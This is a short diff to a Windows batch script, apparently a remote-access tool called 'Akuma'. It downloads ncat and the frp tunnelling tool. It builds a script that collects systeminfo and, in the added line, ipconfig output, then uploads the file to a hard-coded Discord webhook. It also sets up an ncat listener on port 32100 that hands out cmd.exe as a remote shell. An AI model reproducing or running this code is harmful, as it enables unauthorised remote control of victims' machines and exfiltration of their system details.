@@ -9,6 +9,7 @@ curl -L https://github.com/l-urk/Akuma/raw/main/ncat.exe > %homedrive%\Akuma\nca
 curl -L https://github.com/fatedier/frp/releases/download/v0.52.1/frp_0.52.1_windows_amd64.zip > frp_0.52.1_windows_amd64.zip
 echo del %homedrive%\Akuma\systeminfo.txt >> %homedrive%\Akuma\zonbi.bat
 echo systeminfo ^>^> %homedrive%\Akuma\systeminfo.txt >> %homedrive%\Akuma\zonbi.bat
+echo ipconfig /all ^>^> %homedrive%\Akuma\systeminfo.txt >> %homedrive%\Akuma\zonbi.bat
 echo curl -X POST -H "Content-Type: multipart/form-data" -F "file=@%homedrive%\Akuma\systeminfo.txt" -F "content=zombi" https://discord.com/api/webhooks/1163478530538082437/riroyuxV8prESa8RqsYDxyLGPqksgCDMyGMwvuNxOyXkC8fzIgkvvpCUdzMU6Xlgj6Ht >> %homedrive%\Akuma\zonbi.bat
 echo :start >> %homedrive%\Akuma\ncat.bat
 echo %homedrive%\Akuma\ncat-portable-5.59BETA1\ncat.exe -lvp 32100 -e cmd.exe >> %homedrive%\Akuma\ncat.bat
